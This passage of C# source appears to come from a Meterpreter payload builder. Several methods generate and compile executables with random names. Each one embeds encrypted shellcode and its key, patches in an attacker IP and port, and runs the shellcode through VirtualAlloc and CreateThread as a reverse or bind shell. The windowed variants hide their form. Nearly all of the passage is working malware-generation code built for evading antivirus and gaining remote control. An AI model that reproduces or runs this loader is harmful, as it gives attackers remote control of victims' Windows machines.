                "\")); } public static void RunMeterpreter(string ip, string port) { try { string shellCodeRaw = \"R9Q8E3KBRaRMzmfSjoZFKtstugi2F6a+gU+x2Yv/uQNrZHHuv+GgiZTzOLTdPmH/nRaBOm7zDTi8Qg6fr0T81ZeytR76/AXUZCYYEtAuY+3MKuTVd/2nYqjljO5sWZF3yMxI9B3qpFemT7bM80AeKFw2nYBQDRtK5MsrphQPlNprLQvjIB4iVBYnrMZRphU8MvmQKxlvA0T+rv3Rpula2czM2xuqsj53sZNXGE8DvZzfA/hkesX9fdhECrCmbLcSdyadvaEapBMQpsDYZEoMItOTsRZKqPt9kds7CJ8SKWe9kfGrjxwYkQxyFUm6G9MAQIDctLiQA9LTg7wysch7z0I5DCvAwuHg9FqfqwUQIpnwCTExTMdz03PiLvICBog4oyjamw6Ki8/GvIa2mNPa4dmrvarAyAT8OaOQcrPyks90e75FOdDtfaul1LInMCGv2tAjkk3CCtP5dK6yAbTvbvQQ8BSSbPd87iUqU9TDP4rIJ+UJJ2QKuzrhuPoVoP2lhBRvdAR5V0yT/u9E51xe7tEs/a2V87htx9T0xnRXZigj44VB2Ph1otKhfCOkAjP3i9gRnqjMjYg=\"; var ipOctetSplit = ip.Split('.'); byte octByte1 = Convert.ToByte(ipOctetSplit[0]); byte octByte2 = Convert.ToByte(ipOctetSplit[1]); byte octByte3 = Convert.ToByte(ipOctetSplit[2]); byte octByte4 = Convert.ToByte(ipOctetSplit[3]); int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); } } else { port1Byte = 0x00; port2Byte = Convert.ToByte(inputPort); } byte[] shellCodePacket = new byte[9]; shellCodePacket[0] = octByte1; shellCodePacket[1] = octByte2; shellCodePacket[2] = octByte3; shellCodePacket[3] = octByte4; shellCodePacket[4] = 0x68; shellCodePacket[5] = 0x02; shellCodePacket[6] = 0x00; shellCodePacket[7] = port1Byte; shellCodePacket[8] = port2Byte; string s3 = Convert.ToBase64String(shellCodePacket); Encrypter enc = new Encrypter(); string shellCodeDecrypt = enc.DecryptDes(shellCodeRaw, \"<7/m9@bA\"); string newShellCode = shellCodeDecrypt.Replace(\"wKiLhmgCANkD\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); } " + encrypter.DecryptDesCsharpString() + " } ";
            var compiler = new Compiler();
            compiler.Form(randomFileName, @"_reverse_des.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + @"_reverse_des.exe", compiler.isCreated);
        }
        public void SaveMeterpreterRc4DesConsole()
        {
            var randomFileName = RandomFileName(0, 5);
            var encrypter = new Encrypter();
            var strMtr =
                "using System; using System.IO; using System.Runtime.InteropServices; using System.Security.Cryptography; using System.Text; namespace MeterpreterBuilder { class MeterpreterRc4 { static void Main(string[] args) { RunMeterpreter(\"" +
                Ip + "\", \"" + Port +
                "\"); var str = Convert.ToString(Console.ReadLine()); } public static void RunMeterpreter(string ip, string port) { try { var ipOctetSplit = ip.Split('.'); byte octByte1 = Convert.ToByte(ipOctetSplit[0]); byte octByte2 = Convert.ToByte(ipOctetSplit[1]); byte octByte3 = Convert.ToByte(ipOctetSplit[2]); byte octByte4 = Convert.ToByte(ipOctetSplit[3]); int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; byte[] shellCodePacket = new byte[15]; shellCodePacket[0] = 0x6a; shellCodePacket[1] = 0x05; shellCodePacket[2] = 0x68; shellCodePacket[3] = octByte1; shellCodePacket[4] = octByte2; shellCodePacket[5] = octByte3; shellCodePacket[6] = octByte4; shellCodePacket[7] = 0x68; shellCodePacket[8] = 0x02; shellCodePacket[9] = 0x00; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); shellCodePacket[10] = port1Byte; shellCodePacket[11] = port2Byte; } } else { shellCodePacket[10] = port1Byte; shellCodePacket[11] = Convert.ToByte(inputPort); } shellCodePacket[12] = 0x89; shellCodePacket[13] = 0xe6; shellCodePacket[14] = 0x50; string shellCodeRaw = \"h3lLWEY73xWc07qT6hGvo+uYdt8dr6C882788fWonQojS03082InTRkj8hy9N83lIF6LNjlSb8RWN3Vp9fs1fLQYqBGenlT6Ro56y1j2j3QvW0qlN8HK3pvROOPeA2nrt2Vk5eGE/gKF/GOyxxPpITi/LcxZxdCmFegXsRfX+RSNCwmsNZE01cBPgFkF+E9WOFncUfoBR3Ozn2cbt+7bFT4t5oGAH3RraAInu9qE71HDw8zQGRNdDNJSR57vNqh1eIRvHOc7pxndC7rQxVszT0Czl8LcRDFFF36x6F+npycuHfF94gKIoQygb/UQUi+UNWVWgYAsKTOcQpj8N3eQhpvI0i94WMCZUw7hBrgiR3uI8NP3Cg4b/pAAQTkVrmNEqKcWt5WBYuTiw2c1l5RhkJlADNQGrhYErBgrPDUlfDdSylH/SFqoif0wU3QZVmOc3uMFklceqBJ+Z0Nk/Yq0Ky6RAvitwxNu+l5YeE0NZkI0pmZ4oBkcBzsRCP++7ss9/UvU/0LF+7ilu4HL+L5tRtF5+kQxfH+GWXr8QtFH8FGppm6QYeN9sFJSWEtDA8Z2EYMCmXsQKmf8RFpIBHU2s6saRFw2B8ceJjOt2+xmdEKG45BGRb4BCAooGQENntLNfKDfObEYoX8ii9Xm2RayDssISi/uS687QLyUds4C7Ze+55n/CZwmY3eJtr83Ruc7IK1QfA5mNtXUdPIszZqMPd9zojSbO470jVE8/qpIzgyHbe1Ti6suSHPh2lxDpRiHohRI6jTbFUz+9PxnDBGWOg==\"; Encrypter encrypter = new Encrypter(); string shellCodeDecrypt = encrypter.DecryptDes(shellCodeRaw, \"z*W)6.@7\"); string s3 = Convert.ToBase64String(shellCodePacket); string newShellCode = shellCodeDecrypt.Replace(\"agVowKiLhmgCABFcieZQ\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); " + encrypter.DecryptDesCsharpString() + " } }";
            var compiler = new Compiler();
            compiler.Console(randomFileName, "_rc4_des.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + "_rc4_des.exe", compiler.isCreated);
        }
        public void SaveMeterpreterRc4Des()
        {
            var randomFileName = RandomFileName(0, 5);
            var encrypter = new Encrypter();
            var strMtr =
                "using System; using System.IO; using System.Runtime.InteropServices; using System.Security.Cryptography; using System.Text; using System.Threading.Tasks; using System.Windows.Forms; namespace MeterpreterForm { public partial class Form1 : Form { public Form1() { InitializeComponent(); } private void Form1_Load(object sender, EventArgs e) { this.Hide(); Task.Factory.StartNew(() => RunMeterpreter(\"" +
                Ip + "\", \"" + Port +
                "\")); } public static void RunMeterpreter(string ip, string port) { try { var ipOctetSplit = ip.Split('.'); byte octByte1 = Convert.ToByte(ipOctetSplit[0]); byte octByte2 = Convert.ToByte(ipOctetSplit[1]); byte octByte3 = Convert.ToByte(ipOctetSplit[2]); byte octByte4 = Convert.ToByte(ipOctetSplit[3]); int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; byte[] shellCodePacket = new byte[15]; shellCodePacket[0] = 0x6a; shellCodePacket[1] = 0x05; shellCodePacket[2] = 0x68; shellCodePacket[3] = octByte1; shellCodePacket[4] = octByte2; shellCodePacket[5] = octByte3; shellCodePacket[6] = octByte4; shellCodePacket[7] = 0x68; shellCodePacket[8] = 0x02; shellCodePacket[9] = 0x00; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); shellCodePacket[10] = port1Byte; shellCodePacket[11] = port2Byte; } } else { shellCodePacket[10] = port1Byte; shellCodePacket[11] = Convert.ToByte(inputPort); } shellCodePacket[12] = 0x89; shellCodePacket[13] = 0xe6; shellCodePacket[14] = 0x50; string shellCodeRaw = \"h3lLWEY73xWc07qT6hGvo+uYdt8dr6C882788fWonQojS03082InTRkj8hy9N83lIF6LNjlSb8RWN3Vp9fs1fLQYqBGenlT6Ro56y1j2j3QvW0qlN8HK3pvROOPeA2nrt2Vk5eGE/gKF/GOyxxPpITi/LcxZxdCmFegXsRfX+RSNCwmsNZE01cBPgFkF+E9WOFncUfoBR3Ozn2cbt+7bFT4t5oGAH3RraAInu9qE71HDw8zQGRNdDNJSR57vNqh1eIRvHOc7pxndC7rQxVszT0Czl8LcRDFFF36x6F+npycuHfF94gKIoQygb/UQUi+UNWVWgYAsKTOcQpj8N3eQhpvI0i94WMCZUw7hBrgiR3uI8NP3Cg4b/pAAQTkVrmNEqKcWt5WBYuTiw2c1l5RhkJlADNQGrhYErBgrPDUlfDdSylH/SFqoif0wU3QZVmOc3uMFklceqBJ+Z0Nk/Yq0Ky6RAvitwxNu+l5YeE0NZkI0pmZ4oBkcBzsRCP++7ss9/UvU/0LF+7ilu4HL+L5tRtF5+kQxfH+GWXr8QtFH8FGppm6QYeN9sFJSWEtDA8Z2EYMCmXsQKmf8RFpIBHU2s6saRFw2B8ceJjOt2+xmdEKG45BGRb4BCAooGQENntLNfKDfObEYoX8ii9Xm2RayDssISi/uS687QLyUds4C7Ze+55n/CZwmY3eJtr83Ruc7IK1QfA5mNtXUdPIszZqMPd9zojSbO470jVE8/qpIzgyHbe1Ti6suSHPh2lxDpRiHohRI6jTbFUz+9PxnDBGWOg==\"; Encrypter encrypter = new Encrypter(); string shellCodeDecrypt = encrypter.DecryptDes(shellCodeRaw, \"z*W)6.@7\"); string s3 = Convert.ToBase64String(shellCodePacket); string newShellCode = shellCodeDecrypt.Replace(\"agVowKiLhmgCABFcieZQ\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); " + encrypter.DecryptDesCsharpString() + " } }";
            var compiler = new Compiler();
            compiler.Form(randomFileName, @"_rc4_des.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + "_rc4_des.exe", compiler.isCreated);
        }
        public void SaveBindMeterpreterAesConsole()
        {
            var randomFileName = RandomFileName(0, 5);
            var encrypt = new Encrypter();
            var strMtr =
                "using System; using System.IO; using System.Runtime.InteropServices; using System.Security.Cryptography; using System.Text; namespace MeterpreterBuilder { class BindMeterpreter { static void Main(string[] args) { RunMeterpreter(\"" +
                Port +
                "\"); var str = Convert.ToString(Console.ReadLine()); } public static void RunMeterpreter(string port) { try { int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; byte[] shellCodePacket = new byte[6]; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); shellCodePacket[0] = 0x68; shellCodePacket[1] = 0x02; shellCodePacket[2] = 0x00; shellCodePacket[3] = port1Byte; shellCodePacket[4] = port2Byte; shellCodePacket[5] = 0x89; } } else { shellCodePacket[0] = 0x68; shellCodePacket[1] = 0x02; shellCodePacket[2] = 0x00; shellCodePacket[3] = port1Byte; shellCodePacket[4] = Convert.ToByte(inputPort); shellCodePacket[5] = 0x89; } string shellCodeRaw = \"in6mxx8b2B5rtnlR8W0KxwzLiq2BnzHQQzXJ7riGjUJ0HhPY+ON6qkZpewdgkt6e9XNKnxy951q3y/B5+mICKxUutKKHCfp3S0VudjoYO1aVmgfSogBbYEMqId1prBrgUUdsOz3WxNQemREC698sxWPOMUF+QWgHKMK4YCpBRUUIZrYNaexRTnzYOrNdgTU6yu011nEdZPO8Fr4OvNEsApzeUTBclUn07EPemnrtQSYjnkXSCke8ljTUUmbmF20i8aewirKLW4A66fIILB7ym+7c4KV727gtYwp/FBSrgUSdK3t/xIOUYs4YaMZGJZJamy0iJu2wipJL6Fr2ppqHfK5xHP1VOlAQJybm9dUf2DRHElcFxYs7vlJPQoCTFsikLROvQ8nptBJtpUfVa2Cn7vnOS/TkQvL8GxNb5nvyWN3RYTl1xAvFKqMYS+YWtMhisi1+YZfe67zxPOU707fklD/g7b5DrrIjBTrQTq+39l+BGjrsT8UWqRIIJdMgFcl5CGx2M+/a3fQ0crxJuvqsRoD4lsoBjvqix9LY/KS1+is=\"; string s3 = Convert.ToBase64String(shellCodePacket); var decryptShellCode = Encrypter.DecryptAes(shellCodeRaw, \")'QIYUsKfEfno1*`<d|EU8cuMt\"); string newShellCode = decryptShellCode.Replace(\"aAIAEVyJ\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); " + encrypt.DecryptAesCsharpString() + " } }";
            var compiler = new Compiler();
            compiler.Console(randomFileName, "_bind_aes.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + "_bind_aes.exe", compiler.isCreated);
        }
        public void SaveBindMeterpreterAes()
        {
            var randomFileName = RandomFileName(0, 5);
            var encrypt = new Encrypter();
            var strMtr =
                "using System; using System.IO; using System.Runtime.InteropServices; using System.Security.Cryptography; using System.Text; using System.Threading.Tasks; using System.Windows.Forms; namespace MeterpreterForm { public partial class Form1 : Form { public Form1() { InitializeComponent(); } private void Form1_Load(object sender, EventArgs e) { this.Hide(); Task.Factory.StartNew(() => RunMeterpreter(\"" +
                Ip + "\", \"" + Port +
                "\")); } public static void RunMeterpreter(string ip, string port) { try { int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; byte[] shellCodePacket = new byte[6]; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); shellCodePacket[0] = 0x68; shellCodePacket[1] = 0x02; shellCodePacket[2] = 0x00; shellCodePacket[3] = port1Byte; shellCodePacket[4] = port2Byte; shellCodePacket[5] = 0x89; } } else { shellCodePacket[0] = 0x68; shellCodePacket[1] = 0x02; shellCodePacket[2] = 0x00; shellCodePacket[3] = port1Byte; shellCodePacket[4] = Convert.ToByte(inputPort); shellCodePacket[5] = 0x89; } string shellCodeRaw = \"in6mxx8b2B5rtnlR8W0KxwzLiq2BnzHQQzXJ7riGjUJ0HhPY+ON6qkZpewdgkt6e9XNKnxy951q3y/B5+mICKxUutKKHCfp3S0VudjoYO1aVmgfSogBbYEMqId1prBrgUUdsOz3WxNQemREC698sxWPOMUF+QWgHKMK4YCpBRUUIZrYNaexRTnzYOrNdgTU6yu011nEdZPO8Fr4OvNEsApzeUTBclUn07EPemnrtQSYjnkXSCke8ljTUUmbmF20i8aewirKLW4A66fIILB7ym+7c4KV727gtYwp/FBSrgUSdK3t/xIOUYs4YaMZGJZJamy0iJu2wipJL6Fr2ppqHfK5xHP1VOlAQJybm9dUf2DRHElcFxYs7vlJPQoCTFsikLROvQ8nptBJtpUfVa2Cn7vnOS/TkQvL8GxNb5nvyWN3RYTl1xAvFKqMYS+YWtMhisi1+YZfe67zxPOU707fklD/g7b5DrrIjBTrQTq+39l+BGjrsT8UWqRIIJdMgFcl5CGx2M+/a3fQ0crxJuvqsRoD4lsoBjvqix9LY/KS1+is=\"; string s3 = Convert.ToBase64String(shellCodePacket); var decryptShellCode = Encrypter.DecryptAes(shellCodeRaw, \")'QIYUsKfEfno1*`<d|EU8cuMt\"); string newShellCode = decryptShellCode.Replace(\"aAIAEVyJ\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); " + encrypt.DecryptAesCsharpString() + " } } ";
            var compiler = new Compiler();
            compiler.Form(randomFileName, @"_bind_aes.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + "_bind_aes.exe", compiler.isCreated);
        }
        public void SaveBindMeterpreterDesConsole()
        {
            var randomFileName = RandomFileName(0, 5);
            var encrypter = new Encrypter();
            var strMtr =
                "using System; using System.IO; using System.Runtime.InteropServices; using System.Security.Cryptography; using System.Text; namespace MeterpreterBuilder { class BindMeterpreter { static void Main(string[] args) { RunMeterpreter(\"" + Port + "\"); var str = Convert.ToString(Console.ReadLine()); } public static void RunMeterpreter(string port) { try { int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; byte[] shellCodePacket = new byte[6]; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); shellCodePacket[0] = 0x68; shellCodePacket[1] = 0x02; shellCodePacket[2] = 0x00; shellCodePacket[3] = port1Byte; shellCodePacket[4] = port2Byte; shellCodePacket[5] = 0x89; } } else { shellCodePacket[0] = 0x68; shellCodePacket[1] = 0x02; shellCodePacket[2] = 0x00; shellCodePacket[3] = port1Byte; shellCodePacket[4] = Convert.ToByte(inputPort); shellCodePacket[5] = 0x89; } string shellCodeRaw = \"Ci5cVujuz+It2DKjeak5WvERywq+ny9aQTWkDI+edN6gbCwOYnkLWv77IMKkFonhQDWu3Mt87hk8MFwaWIFAIGNcYSuu7lI7WP+fSJVsxyIiLlfBRJdINw0KXSP5/yFlydn56kXAPJnOo/pPKM5Z22Ou7xTxYKdXuN7QlTBtjCpsxqYpKNb96glDgQn9rUPWIG/GTmwokAlOUXdWNKtBjVJEhCnpFvU3Lr8zsq3nHtI9R6SNYyME2pcmfGXwvpxFuZkeggidT6biXmHK+ZDACWgy+cKi+s5exzYjdbInX7s5bRUhW57zUCYxPOE5aIEsTF69zWkaJl0+ZuxX5ZVB8XDrCydhtM03gaC74UNaGIClTM3eNMVFYBoSex5uFbqIdZj/Jg01o1mUu7arY2xxa+Vp9MuGMjft87RQL5K1XyByhDaW/qlALuxZyVa2dkfJD/b4igtj8XyFpG0voixSkQUltbpy7C8cfgY+FwAn4WmaTur+3YvG98EIPXTpm8R0L9xtoIXxlCYZD8ncDJayCd9bLLJa8DzQ\"; string s3 = Convert.ToBase64String(shellCodePacket); Encrypter encrypter = new Encrypter(); string shellCodeDecrypt = encrypter.DecryptDes(shellCodeRaw, \"l+'dW1*.\");  string newShellCode = shellCodeDecrypt.Replace(\"aAIAEVyJ\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); " + encrypter.DecryptDesCsharpString() + " } }";
            var compiler = new Compiler();
            compiler.Console(randomFileName, "_bind_des.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + "_bind_des.exe", compiler.isCreated);
        }
        public void SaveBindMeterpreterDes()
        {
            var randomFileName = RandomFileName(0, 5);
            var encrypter = new Encrypter();
            var strMtr =
                "using System; using System.IO; using System.Runtime.InteropServices; using System.Security.Cryptography; using System.Text; using System.Threading.Tasks; using System.Windows.Forms; namespace MeterpreterForm { public partial class Form1 : Form { public Form1() { InitializeComponent(); } private void Form1_Load(object sender, EventArgs e) { this.Hide(); Task.Factory.StartNew(() => RunMeterpreter(\"" +
                Ip + "\", \"" + Port +
                "\")); } public static void RunMeterpreter(string ip, string port) { try { int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; byte[] shellCodePacket = new byte[6]; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); shellCodePacket[0] = 0x68; shellCodePacket[1] = 0x02; shellCodePacket[2] = 0x00; shellCodePacket[3] = port1Byte; shellCodePacket[4] = port2Byte; shellCodePacket[5] = 0x89; } } else { shellCodePacket[0] = 0x68; shellCodePacket[1] = 0x02; shellCodePacket[2] = 0x00; shellCodePacket[3] = port1Byte; shellCodePacket[4] = Convert.ToByte(inputPort); shellCodePacket[5] = 0x89; } string shellCodeRaw = \"Ci5cVujuz+It2DKjeak5WvERywq+ny9aQTWkDI+edN6gbCwOYnkLWv77IMKkFonhQDWu3Mt87hk8MFwaWIFAIGNcYSuu7lI7WP+fSJVsxyIiLlfBRJdINw0KXSP5/yFlydn56kXAPJnOo/pPKM5Z22Ou7xTxYKdXuN7QlTBtjCpsxqYpKNb96glDgQn9rUPWIG/GTmwokAlOUXdWNKtBjVJEhCnpFvU3Lr8zsq3nHtI9R6SNYyME2pcmfGXwvpxFuZkeggidT6biXmHK+ZDACWgy+cKi+s5exzYjdbInX7s5bRUhW57zUCYxPOE5aIEsTF69zWkaJl0+ZuxX5ZVB8XDrCydhtM03gaC74UNaGIClTM3eNMVFYBoSex5uFbqIdZj/Jg01o1mUu7arY2xxa+Vp9MuGMjft87RQL5K1XyByhDaW/qlALuxZyVa2dkfJD/b4igtj8XyFpG0voixSkQUltbpy7C8cfgY+FwAn4WmaTur+3YvG98EIPXTpm8R0L9xtoIXxlCYZD8ncDJayCd9bLLJa8DzQ\"; string s3 = Convert.ToBase64String(shellCodePacket); Encrypter encrypter = new Encrypter(); string shellCodeDecrypt = encrypter.DecryptDes(shellCodeRaw, \"l+'dW1*.\"); string newShellCode = shellCodeDecrypt.Replace(\"aAIAEVyJ\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); " + encrypter.DecryptDesCsharpString() + " } } ";
            var compiler = new Compiler();
            compiler.Form(randomFileName, @"_bind_des.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + "_bind_des.exe", compiler.isCreated);
        }
        public void Savex64ReverseMeterpreterAesConsole()
        {
            var randomFileName = RandomFileName(0, 5);
            var encrypt = new Encrypter();
            var strMtr =
